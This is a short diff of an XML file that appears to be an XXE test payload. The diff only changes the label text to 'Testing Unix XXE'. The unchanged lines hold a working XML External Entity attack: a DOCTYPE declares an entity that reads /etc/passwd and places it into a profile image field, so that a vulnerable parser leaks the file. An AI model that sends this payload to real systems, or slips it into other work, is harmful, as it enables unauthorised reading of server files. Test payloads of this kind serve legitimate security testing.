@@ -2,5 +2,5 @@
 <!DOCTYPE root [<!ENTITY read SYSTEM "file:///etc/passwd"> ]>
 <profile>
     <profile_image>&read;</profile_image>
-    <about>Testing XXE</about>
+    <about>Testing Unix XXE</about>
 </profile>
